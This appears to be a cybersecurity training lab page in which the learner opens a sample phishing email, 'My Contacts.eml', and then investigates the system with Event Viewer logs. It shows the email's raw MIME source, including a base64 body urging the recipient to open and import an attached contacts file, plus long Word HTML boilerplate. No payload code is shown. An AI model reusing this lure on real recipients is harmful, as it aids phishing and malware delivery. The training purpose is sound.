---
Room for newbs
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b51be00da2beb76d32ba54ee5244aeaa.png)
### Log into VM to test

 Start Machine

Log into Machine at machine_ip

[http://MACHINE_IP](http://machine_ip/)

Username: Maveris

Password: Lab

In this scenario you are an unwitting Maveris employee who routinely works with folks outside of the organization. You received an email compelling you to import some contact information. Let's pretend for a moment the sharing of contact info is not completely out of the ordinary for you to support your mission. 

To play along, open up the Lab folder on the desktop. There is a file within called "My Contacts.eml", click on the file to open. You should see an email that looks like the picture below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/63dbd51280f6cf005468dc03/room-content/d88740711c36eb1e334e9d252087a91a.png)  

  

Go ahead and follow the instructions in the email, click on the attachment, open the file and import the contacts!

Uh oh..... Looks like something did not go as expected. 

This system has sysmon and powershell logging enabled. Feel free to use "Event Viewer" to investigate. (Google provides some good tips on how to look at logs in event viewer)

  

Answer the questions below

```html
To: Fake@maveris.com
Subject: =?utf-8?B?TXkgQ29udGFjdHM=?=
Date: Tue, 21 Feb 2023 9:04:15 -0600
MIME-Version: 1.0
Content-Type: multipart/related;
	boundary="Mark=_-683968373-341984186248"
X-Priority: 3

This is a multi-part message in MIME format.

--Mark=_-683968373-341984186248
Content-Type: multipart/alternative;
	boundary="Mark=_-683968373-341984186456"


--Mark=_-683968373-341984186456
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

SGV5IE1hdmVyaXMgV29ya2VyLA0KIA0KUGxlYXNlIHNlZSBteSBhdHRhY2hlZCBjb250YWN0cyBs
aXN0LiBZb3Ugd2lsbCBoYXZlIHRvIG9wZW4gTXktQ29udGFjdHMgZmlsZSBhbmQgY2xpY2sgdG8g
aW1wb3J0IG15IGNvbnRhY3RzLg0KIA0KVGhhbmtzIQ==

...

<STYLE>
pre {
white-space: pre-wrap; /* css-3 */
white-space: -moz-pre-wrap !important; /* Mozilla, since 1999 */
white-space: -pre-wrap; /* Opera 4-6 */
white-space: -o-pre-wrap; /* Opera 7 */
word-wrap: break-word; /* Internet Explorer 5.5+ */
}
</STYLE>
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta name=ProgId content=Word.Document><meta name=Generator content="Microsoft Word 15"><meta name=Originator content="Microsoft Word 15"><link rel=File-List href="cid:filelist.xml@01D945DB.DAD496E0"><!--[if gte mso 9]><xml>
<o:OfficeDocumentSettings>
<o:AllowPNG/>
</o:OfficeDocumentSettings>
</xml><![endif]--><link rel=themeData href="~~themedata~~"><link rel=colorSchemeMapping href="~~colorschememapping~~"><!--[if gte mso 9]><xml>
<w:WordDocument>
<w:SpellingState>Clean</w:SpellingState>
<w:GrammarState>Clean</w:GrammarState>
<w:DocumentKind>DocumentEmail</w:DocumentKind>
<w:TrackMoves/>
<w:TrackFormatting/>
<w:EnvelopeVis/>
<w:PunctuationKerning/>
<w:ValidateAgainstSchemas/>
<w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
<w:IgnoreMixedContent>false</w:IgnoreMixedContent>
<w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
<w:DoNotPromoteQF/>
<w:LidThemeOther>EN-US</w:LidThemeOther>
<w:LidThemeAsian>X-NONE</w:LidThemeAsian>
<w:LidThemeComplexScript>X-NONE</w:LidThemeComplexScript>
<w:Compatibility>
<w:DoNotExpandShiftReturn/>
<w:BreakWrappedTables/>
<w:SnapToGridInCell/>
<w:WrapTextWithPunct/>
<w:UseAsianBreakRules/>
<w:DontGrowAutofit/>
<w:SplitPgBreakAndParaMark/>
<w:EnableOpenTypeKerning/>
<w:DontFlipMirrorIndents/>
<w:OverrideTableStyleHps/>
</w:Compatibility>
<w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
<m:mathPr>
<m:mathFont m:val="Cambria Math"/>
<m:brkBin m:val="before"/>
<m:brkBinSub m:val="&#45;-"/>
<m:smallFrac m:val="off"/>
<m:dispDef/>
<m:lMargin m:val="0"/>
<m:rMargin m:val="0"/>
<m:defJc m:val="centerGroup"/>
<m:wrapIndent m:val="1440"/>
<m:intLim m:val="subSup"/>
<m:naryLim m:val="undOvr"/>
</m:mathPr></w:WordDocument>
</xml><![endif]--><!--[if gte mso 9]><xml>
<w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="false" DefSemiHidden="false" DefQFormat="false" DefPriority="99" LatentStyleCount="376">
<w:LsdException Locked="false" Priority="0" QFormat="true" Name="Normal"/>
<w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 1"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 2"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 3"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 4"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 5"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 6"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 7"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 8"/>
<w:LsdException Locked="false" Priority="9" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="heading 9"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 6"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 7"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 8"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index 9"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 1"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 2"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 3"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 4"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 5"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 6"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 7"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 8"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" Name="toc 9"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Normal Indent"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="footnote text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="annotation text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="header"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="footer"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="index heading"/>
<w:LsdException Locked="false" Priority="35" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="caption"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="table of figures"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="envelope address"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="envelope return"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="footnote reference"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="annotation reference"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="line number"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="page number"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="endnote reference"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="endnote text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="table of authorities"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="macro"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="toa heading"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Bullet"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Number"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Bullet 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Bullet 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Bullet 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Bullet 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Number 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Number 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Number 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Number 5"/>
<w:LsdException Locked="false" Priority="10" QFormat="true" Name="Title"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Closing"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Signature"/>
<w:LsdException Locked="false" Priority="1" SemiHidden="true" UnhideWhenUsed="true" Name="Default Paragraph Font"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text Indent"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Continue"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Continue 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Continue 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Continue 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="List Continue 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Message Header"/>
<w:LsdException Locked="false" Priority="11" QFormat="true" Name="Subtitle"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Salutation"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Date"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text First Indent"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text First Indent 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Note Heading"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text Indent 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Body Text Indent 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Block Text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Hyperlink"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="FollowedHyperlink"/>
<w:LsdException Locked="false" Priority="22" QFormat="true" Name="Strong"/>
<w:LsdException Locked="false" Priority="20" QFormat="true" Name="Emphasis"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Document Map"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Plain Text"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="E-mail Signature"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Top of Form"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Bottom of Form"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Normal (Web)"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Acronym"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Address"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Cite"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Code"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Definition"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Keyboard"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Preformatted"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Sample"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Typewriter"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="HTML Variable"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Normal Table"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="annotation subject"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="No List"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Outline List 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Outline List 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Outline List 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Simple 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Simple 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Simple 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Classic 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Classic 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Classic 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Classic 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Colorful 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Colorful 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Colorful 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Columns 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Columns 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Columns 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Columns 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Columns 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 6"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 7"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Grid 8"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 4"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 5"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 6"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 7"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table List 8"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table 3D effects 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table 3D effects 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table 3D effects 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Contemporary"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Elegant"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Professional"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Subtle 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Subtle 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Web 1"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Web 2"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Web 3"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Balloon Text"/>
<w:LsdException Locked="false" Priority="39" Name="Table Grid"/>
<w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true" Name="Table Theme"/>
<w:LsdException Locked="false" SemiHidden="true" Name="Placeholder Text"/>
<w:LsdException Locked="false" Priority="1" QFormat="true" Name="No Spacing"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading"/>
<w:LsdException Locked="false" Priority="61" Name="Light List"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 1"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 1"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 1"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 1"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 1"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 1"/>
<w:LsdException Locked="false" SemiHidden="true" Name="Revision"/>
<w:LsdException Locked="false" Priority="34" QFormat="true" Name="List Paragraph"/>
<w:LsdException Locked="false" Priority="29" QFormat="true" Name="Quote"/>
<w:LsdException Locked="false" Priority="30" QFormat="true" Name="Intense Quote"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 1"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 1"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 1"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 1"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 1"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 1"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 1"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 1"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 2"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 2"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 2"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 2"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 2"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 2"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 2"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 2"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 2"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 2"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 2"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 2"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 2"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 2"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 3"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 3"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 3"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 3"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 3"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 3"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 3"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 3"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 3"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 3"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 3"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 3"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 3"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 3"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 4"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 4"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 4"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 4"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 4"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 4"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 4"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 4"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 4"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 4"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 4"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 4"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 4"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 4"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 5"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 5"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 5"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 5"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 5"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 5"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 5"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 5"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 5"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 5"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 5"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 5"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 5"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 5"/>
<w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 6"/>
<w:LsdException Locked="false" Priority="61" Name="Light List Accent 6"/>
<w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 6"/>
<w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 6"/>
<w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 6"/>
<w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 6"/>
<w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 6"/>
<w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 6"/>
<w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 6"/>
<w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 6"/>
<w:LsdException Locked="false" Priority="70" Name="Dark List Accent 6"/>
<w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 6"/>
<w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 6"/>
<w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 6"/>
<w:LsdException Locked="false" Priority="19" QFormat="true" Name="Subtle Emphasis"/>
<w:LsdException Locked="false" Priority="21" QFormat="true" Name="Intense Emphasis"/>
<w:LsdException Locked="false" Priority="31" QFormat="true" Name="Subtle Reference"/>
<w:LsdException Locked="false" Priority="32" QFormat="true" Name="Intense Reference"/>
<w:LsdException Locked="false" Priority="33" QFormat="true" Name="Book Title"/>
<w:LsdException Locked="false" Priority="37" SemiHidden="true" UnhideWhenUsed="true" Name="Bibliography"/>
<w:LsdException Locked="false" Priority="39" SemiHidden="true" UnhideWhenUsed="true" QFormat="true" Name="TOC Heading"/>
<w:LsdException Locked="false" Priority="41" Name="Plain Table 1"/>
<w:LsdException Locked="false" Priority="42" Name="Plain Table 2"/>
<w:LsdException Locked="false" Priority="43" Name="Plain Table 3"/>
<w:LsdException Locked="false" Priority="44" Name="Plain Table 4"/>
<w:LsdException Locked="false" Priority="45" Name="Plain Table 5"/>
<w:LsdException Locked="false" Priority="40" Name="Grid Table Light"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 1"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 1"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 1"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 1"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 1"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 1"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 1"/>
<w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light Accent 2"/>
<w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 2"/>
<w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 2"/>
<w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 2"/>
<w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 2"/>
<w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful Accent 2"/>
<w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful Accent 2"/>
